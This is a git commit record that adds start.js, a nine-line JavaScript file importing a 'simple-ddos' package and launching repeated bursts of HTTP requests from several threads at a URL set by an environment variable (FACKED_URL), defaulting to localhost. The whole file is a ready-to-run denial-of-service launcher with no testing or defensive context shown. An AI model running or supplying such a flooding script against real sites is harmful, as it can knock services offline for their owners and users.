9e7edc9c2553ed1544dd2f67014cd60bf03bf3b1
molfar-goodman <molfarland@gmail.com>
2022-03-11 14:14:08 +0200

    .

---
+++ start.js
@@ -0,0 +1,9 @@
+import { simpleDDoS } from 'simple-ddos'
+
+let url = process.env.FACKED_URL || "http://localhost:3000" 
+let threads = process.env.THREADS || 10
+let requests = process.env.REQUESTS || 100
+let interval = process.env.INTERVAL || 1500
+
+// Launches 10 threads of sending 100 requests every 1.5s
+simpleDDoS(threads, url, requests, interval)
